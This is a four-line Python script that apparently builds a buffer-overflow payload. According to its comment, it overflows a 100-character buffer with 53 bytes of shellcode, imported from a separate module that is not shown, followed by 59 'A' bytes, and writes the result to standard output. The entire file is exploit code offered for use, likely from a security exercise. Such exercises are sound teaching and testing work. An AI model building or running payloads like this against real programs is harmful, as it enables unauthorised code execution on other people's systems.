# overflows the 100 character buffer with 53 bytes of shellcode and 59 A's
from shellcode import shellcode
import sys
sys.stdout.buffer.write(shellcode + b"A"*59)
